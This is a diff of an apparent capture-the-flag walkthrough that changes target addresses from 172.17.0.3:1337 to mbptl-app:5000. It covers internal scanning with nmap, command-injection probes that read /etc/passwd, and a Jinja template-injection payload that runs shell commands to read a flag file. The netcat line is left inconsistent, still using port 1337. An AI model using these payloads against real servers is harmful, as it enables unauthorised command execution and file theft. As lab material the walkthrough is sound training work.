@@ -420,7 +420,7 @@ We discovered that there's another container running on the internal network. Le
 
 ```bash
 # Scan the internal container (adjust IP as needed)
-nmap -p- 172.17.0.3
+nmap -p- mbptl-app
 ```
 
 ### Accessing the Internal Service
@@ -429,17 +429,17 @@ The internal container is running a web service on port 1337. We can access it u
 #### Method 1: Using curl from the compromised host
 ```bash
 # From the root shell on the main container
-curl http://172.17.0.3:1337/
+curl http://mbptl-app:5000/
 ```
 
 #### Method 2: Using wget
 ```bash
-wget -qO- http://172.17.0.3:1337/
+wget -qO- http://mbptl-app:5000/
 ```
 
 #### Method 3: Using netcat
 ```bash
-echo -e "GET / HTTP/1.1\r\nHost: 172.17.0.3:1337\r\n\r\n" | nc 172.17.0.3 1337
+echo -e "GET / HTTP/1.1\r\nHost: mbptl-app:5000\r\n\r\n" | nc mbptl-app 1337
 ```
 
 ### Testing for Vulnerabilities
@@ -447,9 +447,9 @@ The internal service appears to be a simple Flask application. Let's test for co
 
 ```bash
 # Test for command injection
-curl "http://172.17.0.3:1337/?name=test"
-curl "http://172.17.0.3:1337/?name=test';ls;'"
-curl "http://172.17.0.3:1337/?name=test%3Bcat%20/etc/passwd%3B"
+curl "http://mbptl-app:5000/?name=test"
+curl "http://mbptl-app:5000/?name=test';ls;'"
+curl "http://mbptl-app:5000/?name=test%3Bcat%20/etc/passwd%3B"
 ```
 
 ### Exploiting the Internal Service
@@ -457,8 +457,8 @@ The internal service is vulnerable to Server-Side Template Injection (SSTI). We 
 
 ```bash
 # Read the flag file
-curl "http://172.17.0.3:1337/?name={{config.items()}}"
-curl "http://172.17.0.3:1337/?name={{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read()}}"
+curl "http://mbptl-app:5000/?name={{config.items()}}"
+curl "http://mbptl-app:5000/?name={{request.application.__globals__.__builtins__.__import__('os').popen('cat+/flag.txt').read()}}"
 ```
 
 ### Alternative: Direct File Access
